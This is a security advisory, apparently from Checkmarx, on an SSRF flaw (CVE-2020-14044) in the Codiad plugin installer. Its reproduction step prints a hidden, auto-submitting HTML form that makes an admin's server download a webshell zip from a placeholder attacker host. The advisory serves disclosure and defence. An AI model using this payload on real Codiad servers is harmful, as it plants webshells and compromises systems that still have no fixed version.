---
title: Codiad SSRF when installing a plugin
date: 2020-08-20
tags:
	- "php"
	- "ssrf"
	- "rce"
	- "webshell"
advisory: true
origin: https://advisory.checkmarx.net/advisory/CX-2020-4280/
cves:
	- "CVE-2020-14044"
---
## Summary
A Server-Side Request Forgery (SSRF) vulnerability was found in Codiad. A user with admin privileges could use the plugin install feature to make the server request any URL. This could potentially result in an RCE. Combined with other vulnerabilities, an unauthenticated attacker can manipulate the admin to exploit this vulnerability without their knowledge.

## Product
Codiad from v1.7.8.

## Impact
Malicious files could be downloaded to the server.

## Steps to reproduce
1. Login to codiad then visit the page:
```
<html><head></head>
<body>
<form style="opacity: 0;" action="http://[codiad_url]/components/market/controller.php?action=install&type=&name=Manually&repo=http://evilWebSite/webshell/webshell.zip?a=" method="GET">
<button>submit</button>
</form>

<script>document.querySelector('form').submit();</script>
</body></html>
```

### Expected result:
A webshell from ```http://evilWebSite/webshell/webshell.zip``` will be downloaded to the server.

## Remediation
There is no fixed version of Codiad.

## Credit
This issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).

## Resources
1. [Issue](https://github.com/Codiad/Codiad/issues/1122)
